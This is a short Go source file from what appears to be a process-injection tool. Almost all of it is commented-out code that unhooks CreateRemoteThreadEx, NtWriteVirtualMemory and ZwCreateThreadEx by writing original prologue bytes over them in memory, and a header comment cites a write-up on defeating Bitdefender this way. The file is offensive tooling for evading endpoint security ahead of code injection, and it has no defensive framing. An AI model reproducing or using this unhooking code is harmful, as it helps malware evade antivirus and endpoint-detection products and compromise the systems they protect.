package injector

// api-unhooking, but maybe add a script engine to execute it.

// reference:
// https://shells.systems/defeat-bitdefender-total-security-using-
// windows-api-unhooking-to-perform-process-injection

// var (
//	modKernelBase = windows.NewLazySystemDLL("KernelBase.dll")
//	modNTDLL      = windows.NewLazySystemDLL("ntdll.dll")
//
//	procCreateRemoteThreadEx = modKernelBase.NewProc("CreateRemoteThreadEx")
//	procNtWriteVirtualMemory = modNTDLL.NewProc("NtWriteVirtualMemory")
//	procZwCreateThreadEx     = modNTDLL.NewProc("ZwCreateThreadEx")
// )

// 	pHandle := windows.CurrentProcess()
// 	// patch 1: unhook CreateRemoteThreadEx in KernelBase.dll
// 	err := procCreateRemoteThreadEx.Find()
// 	if err != nil {
// 		return err
// 	}
// 	crtAddress := procCreateRemoteThreadEx.Addr()
// 	fmt.Printf("0x%X\n", crtAddress)
//
// 	patch := []byte{0x4C, 0x8B, 0xDC, 0x53, 0x56} // move r11,rsp
// 	_, err = api.WriteProcessMemory(pHandle, crtAddress, patch)
// 	if err != nil {
// 		return errors.WithMessage(err, "failed to unhook CreateRemoteThreadEx")
// 	}
// 	// patch 2: unhook NtWriteVirtualMemory in ntdll.dll
// 	err = procNtWriteVirtualMemory.Find()
// 	if err != nil {
// 		return err
// 	}
// 	wvmAddress := procNtWriteVirtualMemory.Addr()
// 	fmt.Printf("0x%X\n", wvmAddress)
//
// 	patch = []byte{0x4C, 0x8B, 0xD1, 0xB8, 0x3A} // mov eax,3A
// 	_, err = api.WriteProcessMemory(pHandle, wvmAddress, patch)
// 	if err != nil {
// 		return errors.WithMessage(err, "failed to unhook NtWriteVirtualMemory")
// 	}
// 	// patch 3: unhook ZwCreateThreadEx in ntdll.dll
// 	err = procZwCreateThreadEx.Find()
// 	if err != nil {
// 		return err
// 	}
// 	ctAddress := procZwCreateThreadEx.Addr()
// 	fmt.Printf("0x%X\n", ctAddress)
//
// 	patch = []byte{0x4C, 0x8B, 0xD1, 0xB8, 0xBD} // mov eax,BD
// 	_, err = api.WriteProcessMemory(pHandle, ctAddress, patch)
// 	if err != nil {
// 		return errors.WithMessage(err, "failed to unhook ZwCreateThreadEx")
// 	}
